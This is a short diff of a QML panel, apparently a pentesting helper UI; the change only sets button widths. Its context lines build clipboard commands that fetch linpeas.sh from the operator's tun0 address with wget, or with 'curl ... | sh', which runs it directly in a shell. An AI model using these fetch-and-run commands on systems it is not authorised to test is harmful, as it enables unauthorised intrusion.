@@ -132,6 +132,7 @@ Panel {
           spacing: Style.space(8)
 
           Button {
+            width: parent.width
             text: root.serverRunning ? "Stop HTTP Server" : "Start HTTP Server (:8000)"
             bordered: true
             selected: root.serverRunning
@@ -144,12 +145,14 @@ Panel {
           spacing: Style.space(8)
 
           Button {
+            width: Math.floor((parent.width - Style.space(8)) / 2)
             text: "Copy wget linpeas"
             bordered: true
             onClicked: root.copyCmd("wget http://" + root.tun0Ip + ":" + root.serverPort + "/linpeas.sh")
           }
 
           Button {
+            width: parent.width - Math.floor((parent.width - Style.space(8)) / 2) - Style.space(8)
             text: "Copy curl | sh"
             bordered: true
             onClicked: root.copyCmd("curl -s http://" + root.tun0Ip + ":" + root.serverPort + "/linpeas.sh | sh")
